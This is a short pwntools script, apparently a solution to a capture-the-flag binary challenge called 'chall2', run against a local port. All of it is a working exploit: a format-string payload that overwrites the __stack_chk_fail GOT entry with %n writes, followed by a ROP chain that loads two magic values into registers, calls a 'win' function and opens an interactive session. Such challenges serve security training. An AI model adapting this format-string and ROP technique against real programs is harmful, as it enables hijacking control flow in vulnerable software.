from pwn import *

# p = process("./chall2")
p = remote("127.0.0.1",32792)

# context.log_level = "debug"

stack_fail = 0x404020
pop_rdi = 0x401373
pop_rsi_r15 = 0x401371
win = 0x40123b

payload = b"%64x%21$n"
payload += b"%4806x%22$hn"
payload += b"AAABBBBBBBBCCCCCCCCEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHH"
payload += p64(pop_rdi)
payload += p64(0xd34dc4f3)
payload += p64(pop_rsi_r15)
payload += p64(0xf4c3c0d3)
payload += p64(0)
payload += p64(win)
payload += p64(stack_fail+2)
payload += p64(stack_fail)

# gdb.attach(p)

p.sendlineafter("anda: ",payload)
p.interactive()
